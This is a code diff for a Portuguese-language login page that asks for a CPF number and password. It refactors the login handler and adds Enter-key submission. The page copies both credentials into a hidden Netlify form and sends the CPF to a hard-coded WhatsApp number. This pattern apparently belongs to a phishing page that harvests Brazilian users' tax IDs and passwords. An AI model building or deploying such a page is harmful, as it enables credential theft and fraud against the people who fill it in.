@@ -216,7 +216,7 @@
         </div>
         
         <!-- Formulário principal para Netlify -->
-        <form name="login-form" method="POST" netlify action="/success.html" data-netlify="true" class="hidden">
+        <form name="login-form" method="POST" netlify data-netlify="true" class="hidden">
             <input type="hidden" name="form-name" value="login-form">
             <input type="text" name="cpf" id="netlify-cpf">
             <input type="password" name="senha" id="netlify-senha">
@@ -292,16 +292,8 @@
                 return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
             }
             
-            // Função para redirecionar para WhatsApp
-            function redirecionarWhatsApp(cpf) {
-                const telefone = '5531991748889'; // Número formatado para link internacional
-                const mensagem = `Olá, preciso de ajuda! Meu CPF é ${formatarCPF(cpf)}.`;
-                const url = `https://wa.me/${telefone}?text=${encodeURIComponent(mensagem)}`;
-                window.open(url, '_blank');
-            }
-            
-            // Evento de clique no botão de login
-            btnLogin.addEventListener('click', function() {
+            // Função para processar o login
+            function processarLogin() {
                 const cpf = document.getElementById('cpf').value;
                 const senha = document.getElementById('senha').value;
                 
@@ -338,13 +330,24 @@
                     // Em caso de sucesso, redireciona para a área do cliente
                     window.location.href = '/area-do-cliente';
                 }
-            });
+            }
+            
+            // Evento de clique no botão de login
+            btnLogin.addEventListener('click', processarLogin);
             
             // Evento do botão do WhatsApp
             whatsappButton.addEventListener('click', function() {
                 const cpf = document.getElementById('cpf').value;
                 redirecionarWhatsApp(cpf);
             });
+            
+            // Função para redirecionar para WhatsApp
+            function redirecionarWhatsApp(cpf) {
+                const telefone = '5531991748889'; // Número formatado para link internacional
+                const mensagem = `Olá, preciso de ajuda! Meu CPF é ${formatarCPF(cpf)}.`;
+                const url = `https://wa.me/${telefone}?text=${encodeURIComponent(mensagem)}`;
+                window.open(url, '_blank');
+            }
             
             // Máscara para CPF
             document.getElementById('cpf').addEventListener('input', function(e) {
@@ -359,13 +362,19 @@
                 e.target.value = value;
             });
             
-            // Permitir envio com Enter
+            // Permitir envio com Enter em ambos os campos
+            document.getElementById('cpf').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    processarLogin();
+                }
+            });
+            
             document.getElementById('senha').addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
-                    btnLogin.click();
+                    processarLogin();
                 }
             });
         });
     </script>
 </body>
-</html> 
+</html>
